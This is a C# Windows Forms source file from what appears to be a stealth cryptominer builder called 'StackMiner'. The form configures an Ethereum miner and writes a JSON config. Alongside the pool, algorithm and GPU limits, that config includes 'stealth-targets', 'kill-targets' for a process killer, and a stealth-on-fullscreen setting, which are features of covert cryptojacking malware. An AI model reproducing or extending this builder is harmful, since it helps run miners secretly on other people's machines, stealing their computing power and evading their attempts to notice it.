﻿using System;
using System.Drawing;
using System.Windows.Forms;

namespace StackMiner
{
    public partial class MinerETH
    {
        public MinerETH()
        {
            InitializeComponent();
        }

        public Builder F; 
        public int nid = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            formMinerETH.SubHeader = nid + " - " + comboAlgorithm.Text;
            F.ReloadMinerList();
        }

        private void MinerETH_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            F.ReloadMinerList();
            Hide();
        }

        public override string ToString()
        {
            return $"{nid}: {comboAlgorithm.Text} - {txtPoolURL.Text}";
        }

        private void toggleIdle_CheckedChanged(object sender)
        {
            comboIdleGPU.Enabled = toggleIdle.Checked;
            txtIdleWait.Enabled = toggleIdle.Checked;
        }

        private void chkRemoteConfig_CheckedChanged(object sender)
        {
            txtRemoteConfig.Enabled = chkRemoteConfig.Checked;
        }

        private void chkAdvParam_CheckedChanged(object sender)
        {
            txtAdvParam.Enabled = chkAdvParam.Checked;
        }

        private void chkAPI_CheckedChanged(object sender)
        {
            txtAPI.Enabled = chkAPI.Checked;
        }

        private void comboAlgorithm_SelectedIndexChanged(object sender, EventArgs e)
        {
            formMinerETH.SubHeader = nid + " - " + comboAlgorithm.Text;
        }

        private void tabcontrolMinerETH_SelectedIndexChanged(object sender, EventArgs e)
        {
            txtJSON.Text =
$@"{{{Environment.NewLine}
    ""url"": ""{F.formatETHUrl(this)}"",{Environment.NewLine}
    ""algo"": ""{comboAlgorithm.Text}"",{Environment.NewLine}
    ""max-gpu"": {comboMaxGPU.Text.Replace("%", "")},{Environment.NewLine}
    ""idle-wait"": {(toggleIdle.Checked ? txtIdleWait.Text : "0")},{Environment.NewLine}
    ""idle-gpu"": {comboIdleGPU.Text.Replace("%", "")},{Environment.NewLine}
    ""stealth-targets"": ""{(toggleStealth.Checked ? txtStealthTargets.Text : "")}"",{Environment.NewLine}
    ""kill-targets"": ""{(toggleProcessKiller.Checked ? txtKillTargets.Text : "")}"",{Environment.NewLine}
    ""stealth-fullscreen"": {toggleStealthFullscreen.Checked.ToString().ToLower()}{Environment.NewLine}
}}";
        }
    }
}